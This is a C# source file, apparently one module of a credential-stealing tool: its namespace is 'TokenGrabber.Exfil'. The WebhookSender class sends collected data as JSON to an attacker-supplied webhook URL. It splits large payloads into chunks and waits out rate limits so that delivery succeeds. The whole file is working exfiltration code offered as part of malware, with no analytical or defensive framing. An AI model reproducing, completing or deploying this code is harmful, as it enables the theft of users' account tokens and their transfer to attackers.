namespace TokenGrabber.Exfil;

using System.Text;

internal sealed class WebhookSender
{
    private readonly string _webhookUrl;
    private readonly HttpClient _httpClient;
    private const int MaxPayloadSize = 6000;

    public WebhookSender(string webhookUrl)
    {
        _webhookUrl = webhookUrl;
        _httpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(30) };
    }

    public async Task<bool> SendAsync(string jsonPayload)
    {
        if (jsonPayload.Length > MaxPayloadSize)
            return await SendChunkedAsync(jsonPayload);

        var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
        var response = await _httpClient.PostAsync(_webhookUrl, content);

        if ((int)response.StatusCode == 429)
        {
            await HandleRateLimitAsync(response);
            response = await _httpClient.PostAsync(_webhookUrl, content);
        }

        return response.IsSuccessStatusCode;
    }

    private async Task<bool> SendChunkedAsync(string payload)
    {
        var chunks = SplitPayload(payload, MaxPayloadSize);
        foreach (var chunk in chunks)
        {
            var content = new StringContent(chunk, Encoding.UTF8, "application/json");
            var response = await _httpClient.PostAsync(_webhookUrl, content);

            if ((int)response.StatusCode == 429)
                await HandleRateLimitAsync(response);

            await Task.Delay(500);
        }
        return true;
    }

    private static async Task HandleRateLimitAsync(HttpResponseMessage response)
    {
        if (response.Headers.TryGetValues("Retry-After", out var values))
        {
            var retryAfter = double.Parse(values.First());
            await Task.Delay(TimeSpan.FromSeconds(retryAfter + 0.5));
        }
        else
        {
            await Task.Delay(5000);
        }
    }

    private static List<string> SplitPayload(string payload, int maxSize)
    {
        var chunks = new List<string>();
        for (int i = 0; i < payload.Length; i += maxSize)
        {
            chunks.Add(payload.Substring(i, Math.Min(maxSize, payload.Length - i)));
        }
        return chunks;
    }
}
